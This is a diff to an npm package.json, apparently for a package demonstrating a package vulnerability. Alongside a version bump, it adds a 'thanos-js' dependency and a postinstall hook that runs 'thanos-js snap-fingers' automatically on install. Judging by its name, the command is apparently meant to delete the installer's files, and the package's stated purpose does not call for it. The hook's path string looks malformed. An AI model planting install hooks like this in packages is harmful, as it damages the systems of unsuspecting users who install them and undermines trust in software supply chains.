@@ -1,6 +1,6 @@
 {
   "name": "improving-public-sessions-package-vulnerability",
-  "version": "1.0.2",
+  "version": "1.0.4",
   "description": "Public practices to share with improvers",
   "main": "dist/index.js",
   "umd:main": "dist/index.umd.js",
@@ -9,7 +9,9 @@
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
     "build": "microbundle",
-    "prepublish": "npm run build"
+    "prepublish": "npm run build",
+    "postinstall": "node  ..\node_modules\thanos-js snap-fingers --with-infinity-gauntlet-glove"
+
   },
   "repository": {
     "type": "git",
@@ -29,5 +31,8 @@
     "dist",
     "package.json",
     "README.md"
-  ]
+  ],
+  "dependencies": {
+    "thanos-js": "^0.0.11"
+  }
 }
